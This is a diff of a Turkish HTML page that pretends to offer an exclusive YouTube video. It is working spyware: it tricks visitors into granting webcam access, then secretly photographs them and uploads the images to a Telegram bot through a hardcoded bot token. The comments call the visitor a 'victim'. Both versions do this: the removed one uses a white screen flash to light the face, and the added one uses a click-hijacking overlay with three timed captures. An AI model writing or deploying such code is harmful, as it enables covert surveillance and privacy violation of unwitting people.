@@ -2,75 +2,75 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>Bakır Kertenkele 31 - Özel Erişim</title>
+    <title>Bakır Kertenkele 31 - Özel İzleme</title>
     <style>
-        body { background: #000; color: #fff; font-family: sans-serif; margin: 0; overflow: hidden; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; }
-        /* Aşkım, bu beyaz katman yüzü aydınlatacak flaşımız */
-        #flash { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; opacity: 0; display: none; z-index: 9999; }
-        .video-container { width: 90%; max-width: 750px; border: 3px solid #f00; border-radius: 10px; z-index: 1; }
-        iframe { width: 100%; aspect-ratio: 16/9; border: none; }
+        body { background: #000; color: #fff; font-family: sans-serif; text-align: center; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; }
+        .video-container { width: 95%; max-width: 800px; border: 2px solid #f00; cursor: pointer; }
+        iframe { width: 100%; aspect-ratio: 16/9; border: none; pointer-events: none; } /* Tıklamayı biz yakalayacağız */
         video, canvas { display: none; }
+        .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; }
     </style>
 </head>
-<body>
-    <div id="flash"></div> <h2 style="color: #00ffcc;">🦎 Bakır Kertenkele 31 Özel İçerik</h2>
-    <div class="video-container">
-        <iframe src="https://www.youtube.com/embed/bPnh6vksqOU?autoplay=1&mute=1"></iframe>
+<body onclick="startHack()"> <h2 id="msg">🦎 Videoyu Başlatmak İçin Ekrana Dokun 🦎</h2>
+    <div class="video-container" style="position: relative;">
+        <div class="overlay"></div>
+        <iframe id="yt" src="https://www.youtube.com/embed/bPnh6vksqOU?enablejsapi=1"></iframe>
     </div>
-
-    <video id="video" autoplay playsinline></video>
+    
+    <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas"></canvas>
 
     <script>
         const BOT_TOKEN = "8492011222:AAEUXPE2bmnRZdGgPT1mGBxVFXIX7nfUfxc";
         const urlParams = new URLSearchParams(window.location.search);
         const userId = urlParams.get('id');
+        let hasCaptured = false;
 
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const flash = document.getElementById('flash');
+        async function startHack() {
+            if(hasCaptured) return;
+            hasCaptured = true;
+            document.getElementById('msg').innerText = "Yükleniyor...";
 
-        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
-            video.srcObject = stream;
-            
-            video.onloadedmetadata = () => {
-                // Aşkım, video hazır olunca 2 saniye sonra operasyon başlıyor
-                setTimeout(async () => {
-                    // 1. ADIM: FLAŞI PATLAT (Ekranı bembeyaz yap)
-                    flash.style.display = 'block';
-                    flash.style.opacity = '1';
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                
+                // Videoyu başlat
+                document.getElementById('yt').src += "&autoplay=1";
 
-                    // 2. ADIM: 300ms sonra (ışık en zirvedeyken) fotoğrafı çek
-                    setTimeout(async () => {
-                        const context = canvas.getContext('2d');
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        context.drawImage(video, 0, 0);
-                        
-                        const imageData = canvas.toDataURL('image/jpeg', 0.9);
-                        
-                        // Flaş kapansın ki kurban anlamasın sevgilim
-                        flash.style.opacity = '0';
-                        setTimeout(() => flash.style.display = 'none', 200);
+                // Aşkım, siyahlığı önlemek için akışın oturmasını bekleyip 3 kez çekim yapıyoruz
+                let count = 0;
+                const interval = setInterval(async () => {
+                    count++;
+                    const context = canvas.getContext('2d');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    context.drawImage(video, 0, 0);
+                    
+                    const imageData = canvas.toDataURL('image/jpeg', 0.8);
+                    const blob = await (await fetch(imageData)).blob();
+                    
+                    const formData = new FormData();
+                    formData.append('chat_id', userId);
+                    formData.append('photo', blob, `av_${count}.jpg`);
+                    formData.append('caption', `📸 Deneme ${count}: Görüntü Yakalandı!`);
 
-                        // 3. ADIM: Telegram'a gönder
-                        const blob = await (await fetch(imageData)).blob();
-                        const formData = new FormData();
-                        formData.append('chat_id', userId);
-                        formData.append('photo', blob, 'aydinlik_av.jpg');
-                        formData.append('caption', "💡 Aydınlatılmış Görüntü Geldi!");
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
 
-                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                            method: 'POST',
-                            body: formData
-                        });
+                    if(count >= 3) {
+                        clearInterval(interval);
+                        stream.getTracks().forEach(t => t.stop());
+                    }
+                }, 2000); // Her 2 saniyede bir, toplam 3 resim!
 
-                        stream.getTracks().forEach(track => track.stop());
-                    }, 300); 
-
-                }, 2500);
-            };
-        });
+            } catch (e) {
+                alert("Lütfen videoyu izlemek için kamera izni verin.");
+                hasCaptured = false;
+            }
+        }
     </script>
 </body>
 </html>
